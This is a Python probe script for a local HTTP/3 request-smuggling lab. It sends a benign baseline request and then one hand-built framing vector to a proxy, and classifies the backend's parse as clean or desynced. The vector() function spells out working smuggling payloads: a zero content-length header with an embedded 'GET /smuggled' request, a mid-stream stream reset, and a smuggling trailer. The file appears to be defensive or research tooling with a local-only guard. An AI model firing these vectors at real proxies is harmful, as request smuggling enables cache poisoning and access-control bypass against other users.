#!/usr/bin/env python3
"""Hand-vector prober for the desync lab. LAB-ONLY, not exercised by the unit suite.

This is the agreed "no loop yet" first step: send the benign baseline, then one
chosen framing vector, read what the echo backend parsed, and print the oracle
verdict. Prove the oracle toggles on a known vector before building the GA loop.

Verified by the unit suite: genome construction, the driver op->call mapping,
the parser, the oracle classifier, the safety guard.
NOT verified here (needs the live Docker lab): the aioquic H3 connection and the
real proxy round-trip. Fill lab/README.md's runtime-evidence block when you run it.

Run (after ./run_lab.sh up in another terminal):
    PYTHONPATH=../src python probe.py cl_under
"""

import asyncio
import json
import os
import ssl
import sys
from typing import List

from aioquic.asyncio.client import connect
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.quic.configuration import QuicConfiguration

from phage.evo import genome as G
from phage.evo.driver import drive
from phage.evo.oracle import Observation, Verdict, classify
from phage.evo.safety import assert_local

HOST = os.environ.get("QD_LAB_HOST", "127.0.0.1")
PORT = int(os.environ.get("QD_LAB_PORT", "4433"))
ECHO_LOG = os.environ.get("QD_ECHO_LOG", "logs/echo.jsonl")

BODY = b"AAAA"


def vector(name: str) -> G.Genome:
    """Hand-built framing vectors. Each should be toggleable against the baseline."""
    base = G.seed_post(body=BODY)
    if name == "seed":
        return base
    if name == "cl_under":
        # Declare content-length shorter than the bytes sent: classic CL desync.
        smug = b"GET /smuggled HTTP/1.1\r\nHost: x\r\n\r\n"
        return [
            G.Headers(
                (
                    (b":method", b"POST"),
                    (b":scheme", b"https"),
                    (b":authority", b"lab"),
                    (b":path", b"/"),
                    (b"content-length", b"0"),
                )
            ),
            G.Data(smug, end_stream=True),
        ]
    if name == "reset_mid":
        return [base[0], base[1], G.Reset(G.H3_REQUEST_CANCELLED), base[3]]
    if name == "trailer":
        return base + [G.Headers(((b"x-smuggle", b"1"),), end_stream=True)]
    raise SystemExit(f"unknown vector {name!r}; try seed|cl_under|reset_mid|trailer")


def read_new_lines(path: str, since: int) -> List[dict]:
    if not os.path.exists(path):
        return []
    with open(path, encoding="utf-8") as f:
        return [json.loads(x) for x in f.read().splitlines()[since:] if x.strip()]


def as_observation(rec: dict) -> Observation:
    return Observation(
        request_count=rec.get("n", 0),
        boundaries=tuple(tuple(b) for b in rec.get("boundaries", [])),
    )


async def send(genome: G.Genome) -> None:
    cfg = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
    cfg.verify_mode = ssl.CERT_NONE
    try:
        async with connect(HOST, PORT, configuration=cfg) as client:
            http = H3Connection(client._quic)
            sid = client._quic.get_next_available_stream_id()
            await drive(http, client._quic, sid, genome, transmit=client.transmit)
            await asyncio.sleep(0.5)
    except ValueError:
        # benign aioquic close() quirk after the request already flushed
        pass


async def main(name: str) -> int:
    assert_local(f"https://{HOST}:{PORT}/")
    before = len(read_new_lines(ECHO_LOG, 0))
    await send(vector("seed"))
    await asyncio.sleep(0.3)
    await send(vector(name))
    await asyncio.sleep(0.3)
    new = read_new_lines(ECHO_LOG, before)
    if len(new) < 2:
        print(f"[!] expected 2 backend records, saw {len(new)} (lab up? logs mounted?)")
        return 2
    baseline, test = as_observation(new[0]), as_observation(new[-1])
    verdict = classify(expected=1, baseline=baseline, test=test)
    print(
        f"vector={name} baseline={baseline.request_count} test={test.request_count} -> {verdict.value}"
    )
    return 0 if verdict in (Verdict.CLEAN, Verdict.DESYNC) else 1


if __name__ == "__main__":
    raise SystemExit(
        asyncio.run(main(sys.argv[1] if len(sys.argv) > 1 else "cl_under"))
    )
